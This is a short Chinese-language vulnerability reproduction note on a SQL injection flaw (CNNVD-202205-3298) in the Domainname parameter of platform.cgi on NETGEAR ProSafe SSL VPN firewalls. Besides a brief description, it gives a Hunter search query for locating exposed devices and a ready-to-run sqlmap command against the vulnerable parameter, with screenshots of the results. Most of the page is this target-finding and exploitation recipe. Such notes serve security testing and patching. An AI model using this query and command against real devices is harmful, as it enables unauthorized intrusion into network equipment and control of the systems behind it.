# NETGEAR ProSafe SSL VPN SQL注入（CNNVD-202205-3298）

# 一、漏洞简介
NETGEAR FVS336G是美国网件（NETGEAR）公司的一款VPN（虚拟私人网络）防火墙路由器。NETGEAR ProSafe SSL VPN firmware FVS336Gv2 和FVS336Gv3版本存在安全漏洞，该漏洞源于cgi-bin/platform.cgi中的USERDBDomains.Domainname参数缺少过滤转义。攻击者可利用该漏洞进行SQL注入攻击，进而控制系统。

# 二、影响版本
+ NETGEAR ProSafe SSL VPN 

# 三、资产测绘
+ hunter`app.name=="NETGEAR ProSAFE"`
+ 特征

![1694579919965-2ed9bd62-7659-4f42-b63c-fbce7679b1ce.png](./img/3-oAw2G2HWdioD_W/1694579919965-2ed9bd62-7659-4f42-b63c-fbce7679b1ce-587289.png)

# 四、漏洞复现
**sqlmap **

```plain
sqlmap -u "https://xx.xx.xx.xx/scgi-bin/platform.cgi" --form  -p USERDBDomains.Domainname --batch
```

![1694588675748-169097da-b0a4-4bb1-ae8b-f68709d318ee.png](./img/3-oAw2G2HWdioD_W/1694588675748-169097da-b0a4-4bb1-ae8b-f68709d318ee-692978.png)



> 更新: 2024-02-29 23:57:14  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mvw70mskzp0yhtyf>